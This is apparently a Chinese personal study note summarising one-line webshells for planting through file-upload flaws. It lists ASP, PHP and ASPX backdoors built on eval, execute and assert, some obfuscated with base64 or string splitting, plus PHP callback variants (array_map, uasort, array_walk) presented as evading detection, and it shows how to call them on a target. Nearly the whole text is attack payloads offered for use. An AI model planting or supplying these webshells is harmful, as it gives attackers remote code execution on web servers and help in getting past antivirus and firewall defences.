文件上传总结【三】

这几天练习了一下文件上传，各种前端后端的绕过，上传一句话小马，学到了好多，把这几天的笔记整理了一下，对一句话木马做了一下总结。

asp一句话

<% execute(request("1")) %>

php一句话

<?php eval($_POST[1]); ?>

aspx一句话

<script language="C#" runat="server"> 
WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10"); 
</script>

可以躲过雷客图的asp一句话

<% 
set ms = server.CreateObject("MSScriptControl.ScriptControl.1") 
ms.Language="VBScript" 
ms.AddObject "Response", Response 
ms.AddObject "request", request
ms.ExecuteStatement("ev"&"al(request(""1""))") 
%>

不用’<,>’的asp一句话

<script language=VBScript runat=server>execute request("1")</script>

不用双引号的一句话。

<% eval request(chr(35))%>
<% $q=base64_decode;$z=$q(cmVxdWVzdA==);execute $z('sec');%>

不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。（少部分一句话需要php5.4.8+、或sqlite/pdo/yaml/memcached扩展等）

所有一句话使用方法基本都是：

http:// target/shell.php?e=assert 密码pass


$e = $_REQUEST['e'];
$arr = array($_POST['pass'],);
array_filter($arr, $e);


$e = $_REQUEST['e'];
$arr = array($_POST['pass'],);
array_map($e, $arr);

$arr = array('test', $_REQUEST['pass']);
uasort($arr, $e);


$e = $_REQUEST['e'];
$arr = array('test' => 1, $_REQUEST['pass'] => 2);
uksort($arr, $e);

$arr->uasort('assert');


$arr = new ArrayObject(array('test' => 1, $_REQUEST['pass'] => 2));
$arr->uksort('assert');

$arr = array(1);
array_reduce($arr, $e, $_POST['pass']);

$arr = array($_POST['pass']);
$arr2 = array(1);
array_udiff($arr, $arr2, $e);

$arr = array($_POST['pass'] => '|.*|e',);
array_walk($arr, $e, '');

array_walk_recursive($arr, $e, '');
